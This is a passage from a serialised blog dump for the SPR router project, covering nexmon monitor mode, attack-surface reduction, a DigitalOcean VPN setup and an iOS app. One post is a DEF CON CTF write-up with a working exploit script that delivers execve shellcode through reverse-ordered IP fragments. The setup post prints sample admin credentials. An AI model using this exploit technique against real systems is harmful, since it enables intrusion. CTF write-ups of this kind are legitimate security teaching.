*default-logging\\n    restart: always\\n    network_mode: host\\n    privileged: true\\n    volumes:\\n      - /etc/timezone:/etc/timezone:ro\\n      - /etc/localtime:/etc/localtime:ro\\n      - /lib/firmware/cypress/:/lib/firmware/cypress/\\n      - \\"${SUPERDIR}./state/plugins/nexmon:/state/plugins/nexmon\\"\\n      - \\"${SUPERDIR}./state/public/:/state/public/:ro\\"\\n```\\n\\n\\n### Extending the SPR API  \\nThe Nexmon patch breaks the ability to change channels normally. Instead, we can do it\\nwith the \'nexutil\' binary that nexmon provides.\\n\\n\\nWe\'ll rename `sample_plugin.go` to `nexmon_plugin.go` and define a new function\\n\\n```go\\nfunc changeChannel(w http.ResponseWriter, r *http.Request) {\\n\\tchannel := r.URL.Query().Get(\\"channel\\")\\n\\n\\t// Use regexp.MatchString to check if the input matches the pattern\\n\\tmatches, err := regexp.MatchString(\\"^[0-9/]*$\\", channel)\\n\\tif err != nil || !matches {\\n\\t\\thttp.Error(w, \\"Invalid channel string\\", 400)\\n\\t\\treturn\\n\\t}\\n\\n\\terr = exec.Command(\\"/nexmon/nexutil\\", \\"-k\\"+channel).Run()\\n\\tif err != nil {\\n\\t\\thttp.Error(w, err.Error(), 400)\\n\\t\\treturn\\n\\t}\\n}\\n//...\\nfunc main() {\\n//...\\n\\tunix_plugin_router.HandleFunc(\\"/change_channel\\", changeChannel).Methods(\\"PUT\\")\\n}\\n```\\n\\n### Updating the startup script\\n\\nWhen the container runs, we\'ll have it make sure the seemo firmware and kernel module\\nare loaded fresh.\\n\\nstartup.sh:\\n```bash\\n#!/bin/bash\\n\\ncd /nexmon\\ncp brcmfmac43455-sdio.bin /lib/firmware/cypress/cyfmac43455-sdio-standard.bin\\n\\nrmmod brcmfmac_wcc\\nrmmod brcmfmac\\n\\ninsmod brcmfmac.ko\\n\\nsleep 1\\n\\niw phy `iw dev wlan0 info | awk \'/wiphy/ {printf \\"phy\\" $2}\'` interface add mon0 type monitor\\n\\necho [+] Loaded\\n\\ncd /\\n/nexmon_plugin\\n```\\n\\n\\n## Loading\\n\\nAfter building, with `docker compose build`, we\'ll configure the API to load the plugin.\\n\\nIn the UI or by modifying `configs/base/api.json`, add the nexmon plugin*\\n```json\\n{\\n \\"Name\\": \\"nexmon\\",\\n \\"URI\\": \\"nexmon\\",\\n \\"UnixPath\\": \\"/state/plugins/nexmon/socket\\",\\n \\"Enabled\\": true,\\n \\"Plus\\": false,\\n \\"GitURL\\": \\"\\",\\n \\"ComposeFilePath\\": \\"\\"\\n}\\n```\\n\\n\\nStart the plugin with\\n```bash\\nSUPERDIR=/home/spr/super/ docker compose up -d\\n```\\n\\n\\n## Testing\\n\\nRunning tcpdump should show captured 802.11 packets from the environment\\n\\n```shell-session\\n# tcpdump -i wlan0 ...\\n\\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\\nlistening on wlan0, link-type IEEE802_11_RADIO (802.11 plus radiotap header), snapshot length 262144 bytes\\n22:50:27.005540 1876482302us tsft 1.0 Mb/s 2412 MHz 11b -68dBm signal 0dBm noise Beacon (wifi-2.4) [1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 Mbit] ESS CH: 1, PRIVACY\\n22:50:27.046106 1876522917us tsft 1.0 Mb/s 2412 MHz 11b -46dBm signal 0dBm noise Beacon (wifi-2.4) [1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 Mbit] ESS CH: 1, PRIVACY\\n22:50:27.107930 1876584711us tsft 1.0 Mb/s 2412 MHz 11b -70dBm signal 0dBm noise Beacon (wifi-2.4) [1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 Mbit] ESS CH: 1, PRIVACY\\n22:50:27.148500 1876625317us tsft 1.0 Mb/s 2412 MHz 11b -46dBm signal 0dBm noise Beacon (wifi-2.4) [1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 Mbit] ESS CH: 1, PRIVACY\\n22:50:27.210323 1876687100us tsft 1.0 Mb/s 2412 MHz 11b -67dBm signal 0dBm noise Beacon (wifi-2.4) [1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 Mbit] ESS CH: 1, PRIVACY\\n```\\n\\nWe can also verify that our channel switch api extension works\\n\\n```shell-session\\n# curl -u admin:admin localhost/plugins/nexmon/change_channel?channel=4/20 -X PUT\\n# iw dev\\n\\nphy#10\\n        Interface wlan0\\n                ifindex 44\\n                wdev 0xa00000002\\n                addr 00:00:00:00:00:00\\n                type monitor\\n                channel 4 (2427 MHz), width: 20 MHz, center1: 2427 MHz\\n        Interface mon0\\n                ifindex 43\\n                wdev 0xa00000001\\n                addr e4:5f:01:fd:a1:76\\n                type managed\\n                channel 4 (2427 MHz), width: 20 MHz, center1: 2427 MHz\\n                txpower 31.00 dBm\\n...\\n```\\n\\n*\\\\* Note that the SPR UI does not allow specifying a docker compose path directly from the UI.\\nInstead, a user can modify or create a list in `configs/base/custom_compose_paths.json` to do so.*\\n\\n## Running barely-ap\\n\\nBesides sniffing traffic, we can also do wild things with packet injection, like running a WPA2\\nAccess Point written in scapy\\n\\nSince the nexmon patch is a bit hacky, we set the wlan0 mac address ourselves and make sure the channel matches\\n```py\\nap = AP(\\"turtlenet\\", \\"password1234\\", mode=\\"iface\\", iface=\\"wlan0\\", mac=\\"e4:5f:01:cd:a1:76\\", channel=4)\\n```\\n\\n\u201cET VOIL\xc0!\u201d:\\n\\n```shell-session\\nroot@wifilab0:~/barely-ap/src# python3 ap.py                                                                                                                  \\ncommand failed: Device or resource busy (-16)\\nCreated TUN interface scapyap at 10.10.10.1. Bind it to your services if needed.\\nSending Authentication to 56:66:a3:9c:71:8b from e4:5f:01:cd:a1:76 (0x0B)...\\nSending Association Response (0x01)...\\nsent eapol m1 56:66:a3:9c:71:8b\\n[+] New associated station 56:66:a3:9c:71:8b for bssid e4:5f:01:cd:a1:76\\n```\\n\\n\\n## Want to try it yourself on SPR?\\n\\nYou can grab [spr-nexmon here ](https://github.com/spr-networks/spr-nexmon/tree/main)\\nand barely-ap at [https://github.com/spr-networks/barely-ap](https://github.com/spr-networks/barely-ap)."},{"id":"barely-ap-surfaces","metadata":{"permalink":"/pages/blog/barely-ap-surfaces","source":"@site/blog/2023-10-23-barely-attack-surface-experiments.md","title":"Attack Surface Reduction Research (Part 1)","description":"Reducing Attack Surfaces (Part 1)","date":"2023-10-23T00:00:00.000Z","tags":[{"inline":true,"label":"Python","permalink":"/pages/blog/tags/python"},{"inline":true,"label":"Scapy","permalink":"/pages/blog/tags/scapy"},{"inline":true,"label":"WiFi","permalink":"/pages/blog/tags/wi-fi"},{"inline":true,"label":"Linux","permalink":"/pages/blog/tags/linux"}],"readingTime":2.595,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"barely-ap-surfaces","title":"Attack Surface Reduction Research (Part 1)","authors":"ltsrad","tags":["Python","Scapy","WiFi","Linux"]},"unlisted":false,"prevItem":{"title":"Loading up nexmon on a RPI4 with SPR","permalink":"/pages/blog/spr-nexmon"},"nextItem":{"title":"One Weird Trick to fix your CTF Payloads","permalink":"/pages/blog/scapy-revfrag"}},"content":"## Reducing Attack Surfaces (Part 1)\\n\\nSPR lets users create adaptive, micro-segmented networks for connecting and managing devices.\\nIn addition to fine-grained network visibility we also build hardened software and\\nwork to avoid common security flaws. As SPR has matured we\'ve started taking on further efforts\\nto eliminate attack surfaces.\\n\\nWhen it comes to native code: we introduce none. As in, we have not written new native code for SPR anywhere.\\nWe have one BPF filter, and its otherwise golang all the way down. We also do not run standard native services\\nwhere we can avoid them. We have replaced traditional C code for services such as DNS and DHCP with golang implementations, namely CoreDNS and CoreDHCP.\\n\\nThe remaining native code targets that we have in SPR are as follows:\\n- The Linux kernel. For example: ethernet, the tcp/ip stack, nftables, the mac80211 framework and vendor drivers\\n- 802.11 Firmware, Ethernet Firmware\\n- Hostapd\\n- PPP Daemon (off by default)\\n- OS Services (Ubuntu)\\n\\n\x3c!-- truncate --\x3e\\n\\n## Targeting the Whole WiFi Stack\\n\\nWe believe the wifi firmware to be today\'s most insecure target (along with the vendor drivers). Many firmwares are blackbox,\\npoorly documented, and opaque to public security research. We want SPR to be immune to attacks like [Broadpwn](https://blog.exodusintel.com/2017/07/26/broadpwn/)\\nand [Qualcomm Exploitation](https://i.blackhat.com/USA-19/Thursday/us-19-Pi-Exploiting-Qualcomm-WLAN-And-Modem-Over-The-Air-wp.pdf).\\n\\nWe\'ve previously published [barely-ap](https://github.com/spr-networks/barely-ap) to teach people about WiFi authentication.\\nIt can and does work with real wifi chips running in monitor mode to connect clients over the air. We\'ve tested with Android, iOS, and Linux devices.\\n\\nThe plan is to build a series of experiments to host high-speed wifi.\\n\\nIn the near term:\\n1. Develop a Proof-of-Concept AP with scapy in monitor mode (DONE)\\n2. Develop a shim from monitor frames to hostapd running under mac80211_hwsim. This is a work in progress.\\nWe would like to see a rust kernel driver/userland daemon for this\\n\\nFuture:\\n\\n3. A full AP written in rust, operating on raw 802.11 frames (not relying on the Linux kernel 802.11 subsystem)\\n4. Rust protocol firmware for a wifi chip.\\n\\n## Developing a Shim Explained\\n\\nBy running the card in monitor mode,  protocol parsing in the card firmware is substantially reduced if not altogether eliminated.\\n\\nAnd with relaying frames over to macsim, hostapd is good to go.\\nWhat needs to happen however is making this incredibly fast, and researching rate negotiation and\\nwhat calls might need to be made to firmware to enable higher coding rates.\\n\\nBy using hostapd and the kernel mac80211 stack, we still maintain some native attack surface, however we get a known working,\\nsecurity-tested AP that will be compatible with a wide variety of devices, without the firmware protocol parsing and the vendor driver parsing.\\n\\nFor next steps, a proof-of-concept with scapy is actually much too slow. We want to start\\nwith a rust userland daemon leveraging iouring. If that doesn\'t fly then we\'ll go to a shim in the kernel.\\n\\n## Interested in working with us? Please reach out\\n\\nWe are actively seeking an intern to help develop rust+wifi for SPR.\\n\\nYou can contact us at  spr-wifi [ a-t ] supernetworks.org  or hop on the [discord](https://discord.gg/EUjTKJPPAX)"},{"id":"scapy-revfrag","metadata":{"permalink":"/pages/blog/scapy-revfrag","source":"@site/blog/2023-09-15-noppenheimer.md","title":"One Weird Trick to fix your CTF Payloads","description":"Noppenheimer","date":"2023-09-15T00:00:00.000Z","tags":[{"inline":true,"label":"scapy","permalink":"/pages/blog/tags/scapy"},{"inline":true,"label":"fragmentation","permalink":"/pages/blog/tags/fragmentation"},{"inline":true,"label":"pwntools","permalink":"/pages/blog/tags/pwntools"},{"inline":true,"label":"tcpip","permalink":"/pages/blog/tags/tcpip"}],"readingTime":5.675,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"scapy-revfrag","title":"One Weird Trick to fix your CTF Payloads","authors":"ltsrad","tags":["scapy","fragmentation","pwntools","tcpip"]},"unlisted":false,"prevItem":{"title":"Attack Surface Reduction Research (Part 1)","permalink":"/pages/blog/barely-ap-surfaces"},"nextItem":{"title":"How to use the SPR 1-click install on DigitalOcean","permalink":"/pages/blog/virtual-spr-1click"}},"content":"## Noppenheimer\\n\\nAt Defcon CTF Finals, the Final round of  [LiveCTF](https://livectf.com/) went into sudden death.\\nThe challenge was named Noppenheimer, a play on the Oppenheimer film that was released, and NOP (NO-OP) instructions.\\n\\nContestants had to turn a random sequence of bytes into a gadget/shellcode cave by converting bytes into NOPs,\\nby sending \\"nuke\\" Launch commands.\\n\\n```\\nOptions:\\nLAUNCH x,y - Launch a test at position x,y\\nVIEW - See state of test site\\nENDTEST - Conclude testing\\n>\\n```\\n\\nBoth teams solved locally.  But they couldn\'t exploit Noppenheimer against the remote system.\\n\\n\x3c!-- truncate --\x3e\\n\\n## What Went Wrong\\n\\nTeams used a single `read/recv` syscall to receive to get shellcode to run. Without any delays in the program,\\nthe call will return quickly and if the payload is larger than the MTU it will return partial TCP data.\\nThe payloads were crashing on the remote end as they didn\'t have working shellcode.\\n\\nAs @ZetaTwo and @psifertex [explain](https://youtu.be/VxDnpShqloA?t=16683), the conditions which cause this are\\nhighly specific to the exploit with payload length, delays, and other factors. The testers exploits didnt trigger this problem.\\n\\n## Solving with IP Fragmentation\\n\\nIP Packets can be fragmented into multiple packets when they exceed the MTU size,\\nwhich is the maximum amount of octets accepted at layer 2 on Ethernet.\\n\\nBy sending fragments in reverse order, it can be ensured that the recv/read call will\\nget all of the data that has been sent, even beyond the MTU size.\\n\\nHere is a python solution that combines scapy with pwntools, to run inside of a container, which does just that.\\n\\n![](/img/noppenheimer.gif)\\n\\nAs a bonus, it also includes a semi-working TCP implementation written in pure scapy/python.\\n\\n```python\\n#!/usr/bin/env python3\\n# -*- coding: UTF-8 -*-\\n# Author: alex@supernetworks.org <github.com/lts-rad>\\n\'\'\'\\nDemo of TCP w/ sending fragmented payloads with scapy.\\n\\nRun this code inside of a namespace/container. Since Linux sends RST for forged SYN packets,\\nthis code will use iptables to block them.\\n\\n#> iptables -A OUTPUT -p tcp --tcp-flags RST RST -s <src_ip> -j DROP\\n\'\'\'\\nfrom scapy.all import *\\nimport logging\\nfrom pwn import *\\n\\nlogger = logging.getLogger(__name__)\\n#logging.basicConfig(level=logging.DEBUG)\\n#logger.setLevel(logging.DEBUG)\\n\\nclass TcpHandshake(object):\\n\\n    class RLoop(threading.Thread):\\n        def __init__(self, tcp):\\n            threading.Thread.__init__(self)\\n            self.tcp = tcp\\n\\n        def handle_recv(self, pkt):\\n            if pkt and pkt.haslayer(IP) and pkt.haslayer(TCP):\\n                if pkt[TCP].flags & 0x3f == 0x12:   # SYN+ACK\\n                    logger.debug(\\"RCV: SYN+ACK\\")\\n                    self.tcp.send_synack_ack(pkt)\\n                    return\\n                elif  pkt[TCP].flags & 4 != 0:      # RST\\n                    logger.debug(\\"RCV: RST\\")\\n                    #raise Exception(\\"RST\\")\\n                    self.tcp.abort = True\\n                    return\\n                elif pkt[TCP].flags & 0x1 == 1:     # FIN\\n                    logger.debug(\\"RCV: FIN\\")\\n                    self.tcp.send_finack(pkt)\\n                    return\\n                elif pkt[TCP].flags.A: # ACK came in?\\n                    logger.debug(\\"RCV: ACK\\")\\n                    self.tcp.send_base = pkt[TCP].ack\\n\\n                    logger.debug(\\"RCV: %s\\"%repr(pkt))\\n                    if len(pkt[TCP].payload) > 0:\\n                        self.tcp.Q += [bytes(pkt[TCP].payload)]\\n                    self.tcp.send_ack(pkt)\\n\\n                    #great, got an ack, check the send queue for pending data\\n                    while len(self.tcp.send_queue) > 0:\\n                        ret = self.tcp.send_data(self.tcp.send_queue.pop(0))\\n                        if ret == False:\\n                            break\\n\\n                    return\\n                else:\\n                    logger.debug(\\"? Unhandled packet\\")\\n            return\\n\\n\\n        def run(self):\\n            ans = sniff(filter=\\"tcp port %s\\"%self.tcp.target[1], lfilter=self.tcp.match_packet, prn=self.handle_recv, store=False)\\n\\n    def __init__(self, target, sport=31337):\\n        self.seq = 0\\n        self.seq_next = 0\\n        self.target = target\\n        self.dst = next(iter(Net(target[0])))\\n        self.dport = target[1]\\n        self.sport = sport #random.randrange(0, 2**16)\\n        self.seq_start = random.randrange(0, 2**32)\\n        # options=[(\'WScale\', 7)]\\n        self.l4 = IP(version=4,dst=target[0])/TCP(sport=self.sport, dport=self.dport, flags=0,\\n                                        seq=self.seq_start, window=65535)\\n        self.src = self.l4.src\\n        self.Q = []\\n        self.abort = False\\n\\n\\n        self.send_base = self.l4[TCP].seq\\n        self.send_window = self.l4[TCP].window\\n        self.last_sent = self.send_base\\n        self.send_queue = []\\n\\n        self.last_ack  = 0\\n\\n        #let underlying handle ethernet\\n        self.s = conf.L3socket()\\n\\n        self.R = self.RLoop(self)\\n        self.R.start()\\n        logger.debug(\\"init: %s\\"%repr(target))\\n\\n    def start(self):\\n        logger.debug(\\"start\\")\\n        return self.send_syn()\\n\\n    def match_packet(self, pkt):\\n        if pkt.haslayer(IP) and pkt[IP].dst == self.l4[IP].src \\\\\\n           and pkt.haslayer(TCP) and pkt[TCP].dport == self.sport:\\n           if pkt[TCP].ack <= self.seq_next and pkt[TCP].ack >= self.seq_start:\\n               return True\\n           else:\\n               logger.debug(\\"ack was %d expected %d\\" % (pkt[TCP].ack, self.seq_next))\\n        return False\\n\\n    def send_syn(self):\\n        logger.debug(\\"SND: SYN\\")\\n        self.l4[TCP].flags = \\"S\\"\\n        self.seq_next = self.l4[TCP].seq + 1\\n        self.s.send(self.l4)\\n        self.l4[TCP].seq += 1\\n\\n    def send_synack_ack(self, pkt):\\n        logger.debug(\\"SND: SYN+ACK -> ACK with ack # %d\\" % (pkt[TCP].seq + 1))\\n        self.l4[TCP].ack = pkt[TCP].seq + 1\\n        self.l4[TCP].flags = \\"A\\"\\n        self.seq_next = self.l4[TCP].seq\\n        self.s.send(self.l4)\\n\\n    def send_data(self, d):\\n        if self.abort == True:\\n            print(\\"[-] not sending data, aborted !!!\\")\\n            return False\\n        self.l4[TCP].flags = \\"PA\\"\\n\\n        available = self.send_base + self.send_window - self.last_sent\\n\\n        if available == 0:\\n            self.send_queue += [d]\\n            # have to wait\\n            return False\\n        assert available >= 0\\n\\n        if available < len(d):\\n            d, chop = d[:available], d[available:]\\n            self.send_queue += [chop]\\n\\n        self.seq_next = self.l4[TCP].seq + len(d)\\n        self.last_sent = self.seq_next\\n        tosend = self.l4/d\\n\\n        self.s.send(tosend)\\n        self.l4[TCP].seq += len(d)\\n        return True\\n\\n    def send_frag_data(self, d, sz):\\n        if self.abort == True:\\n            print(\\"[-] not sending data, aborted !!!\\")\\n            return\\n        assert sz >= 8\\n        self.l4[TCP].flags = \\"PA\\"\\n\\n        #tbd send window handling for fragments(?)\\n        dat = self.l4/d\\n        fragments = fragment(dat, sz)\\n        for f in fragments[::-1]:\\n            self.s.send(f)\\n\\n        self.seq_next = self.l4[TCP].seq + len(d)\\n        self.last_sent = self.seq_next\\n        self.l4[TCP].seq += len(d)\\n        return True\\n\\n    def send_fin(self):\\n        logger.debug(\\"SND: FIN\\")\\n        self.l4[TCP].flags = \\"F\\"\\n        self.seq_next = self.l4[TCP].seq + 1\\n        self.s.send(self.l4)\\n        self.l4[TCP].seq += 1\\n\\n    def send_rst(self):\\n        logger.debug(\\"SND: RST\\")\\n        self.l4[TCP].flags = \\"R\\"\\n        self.seq_next = self.l4[TCP].seq + 1\\n        self.s.send(self.l4)\\n        self.l4[TCP].seq += 1\\n\\n    def send_finack(self, pkt):\\n        logger.debug(\\"SND: FIN+ACK\\")\\n        self.l4[TCP].flags = \\"FA\\"\\n        self.l4[TCP].ack = pkt[TCP].seq + 1\\n        self.seq_next = self.l4[TCP].seq + 1\\n        self.s.send(self.l4)\\n        self.l4[TCP].seq += 1\\n        #raise Exception(\\"FIN+ACK\\")\\n        self.abort = True\\n\\n    def send_ack(self, pkt):\\n        self.l4[TCP].flags = \\"A\\"\\n\\n        self.last_ack = pkt[TCP].ack\\n        to_acknowledge = len(pkt[TCP].payload)\\n        #logger.debug(\\"SND: ACK with ack # %d\\" % (pkt[TCP].seq + len(pkt[TCP].load)))\\n\\n        if to_acknowledge != 0:\\n            self.l4[TCP].ack = pkt[TCP].seq + to_acknowledge\\n            self.s.send(self.l4)\\n\\n    def recv(self, timeout):\\n        elapsed = 0\\n        while (timeout != 0) and (elapsed < timeout):\\n            if len(self.Q) > 0:\\n                retval = self.Q.pop(0)\\n                return retval\\n            time.sleep(0.01)\\n            elapsed += 0.\\n        #returning nothing\\n        return \\"\\"\\n\\n    def clear_recv(self):\\n        self.Q = []\\n\\n    def wait_all_acks(self, timeout=0):\\n        elapsed = 0\\n        delta = 0.1\\n        while (timeout != 0) and (elapsed < timeout):\\n            if self.last_ack == self.seq_next and len(self.send_queue) == 0:\\n                return True\\n            time.sleep(delta)\\n            elapsed += delta\\n        return False\\n\\n\\n\\nif __name__== \'__main__\':\\n    sport = random.randint(40000, 60000)\\n    os.system(\\"iptables -F OUTPUT\\")\\n    os.system(\\"iptables -A OUTPUT -p tcp --sport %d --tcp-flags RST RST -j DROP\\"%sport)\\n    conf.verb = 0\\n\\n    tcp_hs = TcpHandshake((\\"172.17.0.2\\", 31337), sport=sport)\\n\\n    r = tubes.sock.sock()\\n    r.send = tcp_hs.send_data\\n    r.recv = tcp_hs.recv\\n    tcp_hs.start()\\n\\n    tosend = b\\"\\"\\n    def nuke(offset):\\n        global tosend\\n        # scapy send is slow. to speed it up,\\n        # chunk the commands\\n        if len(tosend) > 400:\\n            r.send(tosend)\\n            tosend = b\\"\\"\\n\\n        tosend += b\'LAUNCH %d,%d\\\\n\'%(offset%0x10,offset//0x10)\\n\\n    def nukes(a, b):\\n        for i in range(a, b):\\n            nuke(i)\\n\\n\\n    nukes(0, 0x40)\\n    nukes(0x50, 0x58)\\n    nukes(0x5b, 0x60)\\n    nukes(0x70, 0xb0)\\n    nukes(0xc0, 0xc3)\\n\\n    nukes(0xc6, 0xc7)\\n    nukes(0xca, 0xd0)\\n    nuke(0xdc)\\n    nukes(0xe0, 0xec)\\n    nukes(0xed, 0xf0)\\n\\n    nukes(0x108, 0x10c)\\n    nukes(0x10d, 0x473)\\n    nukes(0x495, 0xc17)\\n    nuke(0)\\n\\n    if tosend:\\n        r.send(tosend)\\n\\n    tosend = b\'ENDTEST\\\\n\'\\n    r.send(tosend)\\n\\n    context.arch = \'amd64\'\\n    sc = b\'\\\\x90\\\\x31\\\\xc0\\\\x48\\\\xbb\\\\xd1\\\\x9d\\\\x96\\\\x91\\\\xd0\\\\x8c\\\\x97\\\\xff\\\\x48\\\\xf7\\\\xdb\\\\x53\\\\x54\\\\x5f\\\\x99\\\\x52\\\\x57\\\\x54\\\\x5e\\\\xb0\\\\x3b\\\\x0f\\\\x05\'\\n\\n    print(\\"******** sending shellcode ***********\\")\\n    d = b\'\\\\x90\' * (0xd00+200) + sc\\n\\n    tcp_hs.send_frag_data(d, 100)\\n    #raw_input()\\n\\n    r.recvuntil(b\'ENDTEST\')\\n\\n    #raw_input(\\"Ready?\\")\\n    print(\\"Waiting for data to come in...\\")\\n    time.sleep(2)\\n    tcp_hs.clear_recv()\\n    print(\\"[+] Good\\")\\n\\n    try:\\n        r.interactive()\\n    except:\\n        print(\'aborted\')\\n\\n    print(\\"over\\")\\n    raw_input()\\n    os.system(\\"iptables -F OUTPUT\\")\\n    tcp_hs.send_fin()\\n    tcp_hs.send_rst()\\n```\\n\\n```\\nFROM python:3.8-slim\\n\\n# Set the working directory\\nWORKDIR /app\\n\\n# Install system dependencies\\nRUN apt-get update && apt-get install -y libpcap-dev\\n\\n# Install Scapy using pip\\nRUN pip install scapy pwntools\\nRUN pip uninstall pyelftools -y\\nRUN pip install pyelftools==0.29\\n\\nRUN apt-get install -y iptables net-tools\\nRUN apt-get install -y tmux tcpdump iproute2\\nCOPY connect.py .\\n\\nENTRYPOINT [\\"/app/connect.py\\"]\\n```"},{"id":"virtual-spr-1click","metadata":{"permalink":"/pages/blog/virtual-spr-1click","source":"@site/blog/2023-09-10-virtual-spr-one-click.md","title":"How to use the SPR 1-click install on DigitalOcean","description":"Introduction","date":"2023-09-10T00:00:00.000Z","tags":[{"inline":true,"label":"SPR","permalink":"/pages/blog/tags/spr"},{"inline":true,"label":"Virtual","permalink":"/pages/blog/tags/virtual"},{"inline":true,"label":"Cloud","permalink":"/pages/blog/tags/cloud"},{"inline":true,"label":"VPN","permalink":"/pages/blog/tags/vpn"},{"inline":true,"label":"WireGuard","permalink":"/pages/blog/tags/wire-guard"},{"inline":true,"label":"DigitalOcean","permalink":"/pages/blog/tags/digital-ocean"}],"readingTime":2.08,"hasTruncateMarker":true,"authors":[{"name":"Philip Olausson","url":"https://twitter.com/capslcc","key":"ltspo","page":null}],"frontMatter":{"slug":"virtual-spr-1click","title":"How to use the SPR 1-click install on DigitalOcean","authors":"ltspo","tags":["SPR","Virtual","Cloud","VPN","WireGuard","DigitalOcean"]},"unlisted":false,"prevItem":{"title":"One Weird Trick to fix your CTF Payloads","permalink":"/pages/blog/scapy-revfrag"},"nextItem":{"title":"SPR Now Available on the iOS App Store","permalink":"/pages/blog/ios-app-released"}},"content":"## Introduction\\n\\nThis guide allows you to setup your own cloud VPN using SPR for *$4/month* on the DigitalOcean Marketplace. It features ad blocking, firewall rules,\\nand device micro-segmentation.\\n\\nIf you want to dive in directly: [Click here](https://cloud.digitalocean.com/droplets/new?app=spr&onboarding_origin=marketplace&appId=145188909&refcode=24603f3ca4bd&region=nyc1&size=s-1vcpu-512mb-10gb&type=applications&image=supernetworks-spr) to create a droplet using the SPR image. Else, follow along in the steps below.\\n\\n\x3c!-- truncate --\x3e\\n\\n## Step 1 - Create a SPR Droplet\\n\\nTo create a SPR Droplet from the [Digital Ocean marketplace](https://marketplace.digitalocean.com/apps/spr), press the **Create SPR Droplet** button:\\n\\n![](/img/cloud-digital-ocean-1click-1.png)\\n\\nPressing the button will take you to the DigitalOcean control panel.\\nIf you are not logged into your DigitalOcean account, you need to login. If you don\'t have an account, you can [sign up for one](https://cloud.digitalocean.com/registrations/new).\\n\\n## Step 2 - Configure your droplet\\n\\n![](/img/cloud-digital-ocean-2.png)\\n\\nSelect a region & be sure to create a SSH key if you don\'t have one configured already.\\n\\nFor Droplet Size, the smallest *$4/month* with 512 MB RAM is enough but feel free to choose another one.\\n\\nAfter you\'ve made all your choices, press **Create droplet**.\\n\\n## Step 3 - Access your droplet\\n\\n![](/img/cloud-digital-ocean-1click-2.png)\\n\\nIn the droplet listing you can see the IP address, click **Get started** to see the tutorial and how to access you server.\\n\\n![](/img/cloud-digital-ocean-1click-3.png)\\n\\n```bash\\nssh root@165.232.129.119\\n\\n```\\n\\n## Step 4 - Generate a VPN Key and Connect\\n\\n```bash\\ncd /home/spr/super && ./virtual_install.sh\\n```\\n\\nYou can scan the QR Code generated from the terminal\\n\\n![](/img/cloud-digital-ocean-qrcode.png)\\n\\n## Step 5 -- Connecting to SPR\\n\\nTo connect to the SPR UI/API, it\'s possible to connect via the VPN, or to connect with an SSH tunnel\\n\\nFor the ssh tunnel approach, reconnect to the droplet, with forwarding options\\n```bash\\nssh root@165.22.182.180  -N -L 8000:127.0.0.1:8000\\n```\\n\\nThen navigate to localhost:8000. The password is auto generated by the droplet and presented on the first login .\\n```\\n[+] login information:\\n==========================================================\\n http tunnel: ssh 165.22.182.180 -N -L 8000:127.0.0.1:8000\\n         url: http://localhost:8000/\\n    username: admin\\n    password: SmczeGzcEPbBmQEi\\n       token: 6Yd2MtMSkm0TiDG2ZIWqoFqxgiHN9HzRJ24m/U8HKw4=\\n==========================================================\\n```\\n\\nYou can update the admin password by modifying `/home/spr/super/configs/auth/auth_users.json` directly.\\n\\nAlternately, when connected to the VPN, the default address for the SPR frontend will be at 192.168.2.1. This can be updated\\nunder the \'supernetworks\' panel.\\n\\n## Conclusion\\n\\nWith this guide we\'ve described how to setup virtual SPR to get a secure, self-hosted VPN for $4/month. The setup allows *you* to route and redirect traffic, block ads, and automate networks tasks.\\n\\nSee the [spr-virtual-image-build](https://github.com/spr-networks/spr-virtual-image-build) repository on GitHub for how the image is built.\\n\\nRead more about running SPR in the cloud in [the Virtual SPR Guide](/blog/virtual%20SPR#configure-the-vpn-client-on-your-device)."},{"id":"ios-app-released","metadata":{"permalink":"/pages/blog/ios-app-released","source":"@site/blog/2023-05-30-ios-app.md","title":"SPR Now Available on the iOS App Store","description":"Secure Private Router Configuration Made Easy","date":"2023-05-30T00:00:00.000Z","tags":[{"inline":true,"label":"iOS","permalink":"/pages/blog/tags/i-os"},{"inline":true,"label":"WiFi","permalink":"/pages/blog/tags/wi-fi"},{"inline":true,"label":"VPN","permalink":"/pages/blog/tags/vpn"}],"readingTime":3.57,"hasTruncateMarker":true,"authors":[{"name":"Philip Olausson","url":"https://twitter.com/capslcc","key":"ltspo","page":null}],"frontMatter":{"slug":"ios-app-released","title":"SPR Now Available on the iOS App Store","authors":"ltspo","tags":["iOS","WiFi","VPN"]},"unlisted":false,"prevItem":{"title":"How to use the SPR 1-click install on DigitalOcean","permalink":"/pages/blog/virtual-spr-1click"},"nextItem":{"title":"Barely AP is Almost an Access Point","permalink":"/pages/blog/barely-ap"}},"content":"import iosHome from \'/static/img/ios-home.png\'\\nimport iosHome2 from \'/static/img/ios-home-2.png\'\\nimport iosDevice from \'/static/img/ios-device.png\'\\nimport iosDeviceAdd1 from \'/static/img/ios-device-add-1.png\'\\nimport iosDeviceAdd2 from \'/static/img/ios-device-add-2.png\'\\nimport iosDNS from \'/static/img/ios-dns.png\'\\nimport iosDNSBlock from \'/static/img/ios-dns-block.png\'\\nimport iosVPN from \'/static/img/ios-vpn.png\'\\nimport iosVPN2 from \'/static/img/ios-vpn-2.png\'\\nimport appDownload from \'/static/img/appdownload.png\'\\n\\n## Secure Private Router Configuration Made Easy\\n\\nWe are happy to announce the release of our iOS app for the SPR project. You can manage your SPR effortlessly, even while you\'re on the go with the VPN capabilities. The App is available today for $0.99. Revenue goes towards the development of SPR.\\n\\n<div style={{ display: \\"flex\\", flexDirection: \\"row\\", padding:4, gap:8, marginBottom: 20 }}>\\n\\n<a href=\\"https://apps.apple.com/us/app/secure-programmable-router/id6443709201\\">\\n<img src={appDownload} width={\\"20%\\"} />\\n</a>\\n</div>\\n\\n\\n\x3c!-- truncate --\x3e\\n\\n[Read more about SPR here](/pages/docs/intro)\\n\\n### Simplified Configuration\\n\\nYou can set up your new router, configure network firewall rules, manage devices, and\\nestablish secure VPN connections with just a few taps.\\n\\n<div style={{ display: \\"flex\\", flexDirection: \\"row\\", padding:4, gap:8, marginBottom: 20 }}>\\n\\n<img src={iosHome} width={\\"50%\\"} />\\n<img src={iosHome2} width={\\"50%\\"} 